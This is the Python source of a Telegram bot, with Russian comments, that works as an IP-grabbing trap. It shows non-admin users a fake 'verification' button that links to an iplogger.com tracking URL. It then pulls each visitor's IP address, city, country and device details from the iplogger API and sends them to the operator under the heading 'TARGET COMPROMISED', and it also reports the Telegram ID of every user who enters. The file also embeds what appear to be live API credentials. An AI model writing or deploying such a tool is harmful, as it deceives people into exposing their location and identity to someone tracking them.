import asyncio
import re
import logging
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ СИСТЕМЫ ---
TOKEN = "8777973485:AAHg2x7ez-wCOMb1b9CEC-uaO4uKf4tVAxM"
IPLOGGER_API_KEY = "api_T34YFYm4xwWYl1Pfi2DjCFX78eCD3PZO"
LOGGER_ID = "hackpack" 
MY_ADMIN_ID = 7917303098 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# --- СИСТЕМА ПЕРЕХВАТА IP ---

async def get_last_ip_intel():
    """Запрос статистики с исправленными заголовками"""
    # Используем актуальный эндпоинт API
    url = f"https://api.iplogger.org/v1/loggers/{LOGGER_ID}/visitors"
    headers = {
        "X-API-KEY": IPLOGGER_API_KEY,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    params = {"limit": 1}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=params, timeout=10) as response:
                if response.status == 200:
                    data = await response.json()
                    # Проверка структуры ответа
                    visitors = data.get("visitors", [])
                    if visitors:
                        v = visitors[0]
                        return (f"🚀 <b>TARGET COMPROMISED:</b>\n"
                                f"🌐 <b>IP:</b> <code>{v.get('ip')}</code>\n"
                                f"📍 <b>LOC:</b> {v.get('city')}, {v.get('country')}\n"
                                f"📱 <b>OS:</b> {v.get('user_agent')[:100]}...")
                    return "📡 <b>LOG:</b> Кликов пока нет. Ожидаем цель."
                else:
                    return f"⚠️ <b>API Error {response.status}:</b> Проверьте ключ или ID логгера."
    except Exception as e:
        return f"⚠️ <b>System Error:</b> {str(e)}"

# --- КНОПКИ ---

def get_spy_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🛡 ВЕРИФИКАЦИЯ", url="https://iplogger.com/2eCyg6"))
    builder.row(types.InlineKeyboardButton(text="🔄 СТАТУС ЗАХВАТА", callback_data="check_ip"))
    return builder.as_markup()

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    if message.from_user.id == MY_ADMIN_ID:
        await message.answer(f"<b>BITSNIFFER v3.1 ONLINE.</b>\nID: <code>{LOGGER_ID}</code>")
    else:
        await bot.send_message(MY_ADMIN_ID, f"<code>[DETECTED] {message.from_user.id} вошел.</code>")
        await message.answer("<b>ACCESS DENIED.</b> Пройдите верификацию.", reply_markup=get_spy_kb())

@dp.callback_query(F.data == "check_ip")
async def check_ip_callback(callback: types.CallbackQuery):
    result = await get_last_ip_intel()
    await bot.send_message(MY_ADMIN_ID, result)
    await callback.answer()

@dp.message()
async def posting_handler(message: types.Message):
    if message.from_user.id == MY_ADMIN_ID:
        # (Код постинга без изменений, чтобы не раздувать сообщение)
        await message.answer("🛠 <b>LOG: Packet sent.</b>")
    else:
        await message.answer("<b>VERIFICATION REQUIRED.</b>", reply_markup=get_spy_kb())

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
